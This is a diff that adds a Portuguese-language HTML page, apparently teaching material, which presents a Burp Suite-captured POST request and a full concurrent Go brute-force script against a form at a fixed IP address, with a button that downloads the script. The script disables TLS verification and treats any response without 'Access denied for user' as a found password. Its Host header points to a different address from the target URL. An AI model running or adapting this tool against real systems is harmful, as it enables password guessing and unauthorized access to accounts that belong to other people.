@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gerador de Script HTTP</title>
+<style>
+  body {
+    font-family: 'Courier New', Courier, monospace;
+    background-color: #0a0a0a;
+    color: #00ff00;
+    padding: 20px;
+    line-height: 1.6;
+  }
+  h2, h3 {
+    color: #00ff00;
+    border-bottom: 1px solid #444;
+    padding-bottom: 5px;
+  }
+  p {
+    color: #fff;
+  }
+  label, textarea, input[type="text"], button {
+    display: block;
+    margin-bottom: 10px;
+    width: 100%;
+    border: 1px solid #444;
+    padding: 8px;
+    background-color: #222;
+    color: #00ff00;
+    border-radius: 4px;
+    box-sizing: border-box;
+    font-family: 'Courier New', Courier, monospace;
+  }
+  textarea {
+    height: 200px;
+    resize: vertical;
+  }
+  button {
+    background-color: #00ff00;
+    color: #000;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background-color 0.3s;
+  }
+  button:hover {
+    background-color: #00dd00;
+  }
+  #generatedScript {
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 14px;
+  }
+</style>
+</head>
+<body>
+<h2>Gerador de Script HTTP</h2>
+<p>Observe os dados abaixo para entender como o script de força bruta foi desenvolvido e crie o seu com base nessas informações. A requisição foi capturada usando o Burp Suite.</p>
+
+<label for="urlInput">URL alvo:</label>
+<input type="text" id="urlInput" value="http://192.111.132.100/comments">
+
+<label for="paramInput">Parâmetros da requisição (no formato chave=valor separados por &):</label>
+<input type="text" id="paramInput" value="comment=payloads&submit=Submit">
+
+<label for="paramMsg">Mensagens de erro:</label>
+<input type="text" id="paramMsg" value="Access denied for user">
+
+<label>Cabeçalhos da requisição (no formato chave: valor separados por linhas):</label>
+<textarea id="generatedScript" readonly>POST /comments HTTP/1.1
+Host: 192.111.132.187
+Content-Length: 26
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.111.132.187
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.111.132.187/comments
+Accept-Encoding: gzip, deflate, br
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,my;q=0.6
+Connection: keep-alive
+
+comment=fdfd&submit=Submit</textarea>
+
+
+<h3>Script Gerado:</h3>
+<textarea id="generatedScript" readonly>package main
+
+import (
+	"bufio"
+	"compress/gzip"
+	"crypto/tls"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"net/url"
+	"os"
+	"strings"
+	"sync"
+	"sync/atomic"
+)
+
+const (
+	targetURL     = "http://192.111.132.100/comments"
+	workerCount   = 10  // Número de goroutines para processar senhas
+	logInterval   = 100 // Intervalo para exibir a quantidade de requisições realizadas
+	startLine     = 1 // Linha para iniciar a leitura do arquivo
+)
+
+var requestCount int32
+
+func main() {
+	// Abrir arquivo de senhas
+	file, err := os.Open("payloads.txt")
+	if err != nil {
+		fmt.Printf("Erro ao abrir arquivo de senhas: %v\n", err)
+		return
+	}
+	defer file.Close()
+
+	passwords := make(chan string, workerCount)
+	var wg sync.WaitGroup
+
+	// Iniciar workers
+	for i := 0; i < workerCount; i++ {
+		wg.Add(1)
+		go worker(passwords, &wg)
+	}
+
+	// Ler e enviar senhas para o canal
+	scanner := bufio.NewScanner(file)
+	lineNumber := 0
+	for scanner.Scan() {
+		lineNumber++
+		if lineNumber < startLine {
+			continue // Pular até a linha de início
+		}
+		passwords <- scanner.Text()
+	}
+	close(passwords)
+
+	// Aguardar conclusão dos workers
+	wg.Wait()
+
+	if err := scanner.Err(); err != nil {
+		fmt.Printf("Erro ao ler arquivo de senhas: %v\n", err)
+	}
+
+	fmt.Println("Força bruta concluída. Senha não encontrada.")
+}
+
+func worker(passwords <-chan string, wg *sync.WaitGroup) {
+	defer wg.Done()
+
+	// Configurar cliente HTTP para ignorar verificação SSL
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{Transport: tr}
+
+	for password := range passwords {
+		// Criando dados do formulário
+		formData := url.Values{
+			"comment": {password},
+			"submit":  {"Submit"},
+		}
+
+		// Criando requisição POST
+		req, err := http.NewRequest("POST", targetURL, strings.NewReader(formData.Encode()))
+		if err != nil {
+			fmt.Printf("Erro ao criar requisição: %v\n", err)
+			continue
+		}
+
+		// Configurando cabeçalhos da requisição
+		req.Header.Set("Host", "192.111.132.187")
+		req.Header.Set("Content-Length", "26")
+		req.Header.Set("Cache-Control", "max-age=0")
+		req.Header.Set("Upgrade-Insecure-Requests", "1")
+		req.Header.Set("Origin", "http://192.111.132.187")
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36")
+		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+		req.Header.Set("Referer", "http://192.111.132.187/comments")
+		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+		req.Header.Set("Accept-Language", "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,my;q=0.6")
+		req.Header.Set("Connection", "keep-alive")
+
+		// Realizando a requisição
+		resp, err := client.Do(req)
+		if err != nil {
+			fmt.Printf("Erro ao enviar requisição: %v\n", err)
+			continue
+		}
+		defer resp.Body.Close()
+
+		// Incrementando o contador de requisições
+		count := atomic.AddInt32(&requestCount, 1)
+		if count%logInterval == 0 {
+			fmt.Printf("Requisições realizadas: %d\n", count)
+		}
+
+		if resp.StatusCode == http.StatusOK {
+			var body []byte
+			if resp.Header.Get("Content-Encoding") == "gzip" {
+				gz, err := gzip.NewReader(resp.Body)
+				if err != nil {
+					fmt.Printf("Erro ao ler resposta gzip: %v\n", err)
+					continue
+				}
+				body, err = ioutil.ReadAll(gz)
+				if err != nil {
+					fmt.Printf("Erro ao ler corpo da resposta gzip: %v\n", err)
+					continue
+				}
+				gz.Close()
+			} else {
+				body, err = ioutil.ReadAll(resp.Body)
+				if err != nil {
+					fmt.Printf("Erro ao ler corpo da resposta: %v\n", err)
+					continue
+				}
+			}
+
+			// Verificando o resultado da tentativa
+			if !strings.Contains(string(body), "Access denied for user") {
+				fmt.Printf("Senha encontrada: %s\n", password)
+			} else {
+				fmt.Printf("Senha incorreta (%d): %s\n", resp.StatusCode, password)
+			}
+		} else {
+			fmt.Printf("Resposta inesperada (%d): %s\n", resp.StatusCode, password)
+		}
+	}
+}
+</textarea>
+<button onclick="downloadScript()">Baixar Script</button>
+
+<script>
+
+function downloadScript() {
+    const script = document.getElementById('generatedScript').value;
+    const blob = new Blob([script], { type: 'text/plain' });
+    const link = document.createElement('a');
+    link.href = URL.createObjectURL(blob);
+    link.download = 'script.go';
+    link.click();
+}
+
+
+</script>
+
+</body>
+</html>
+
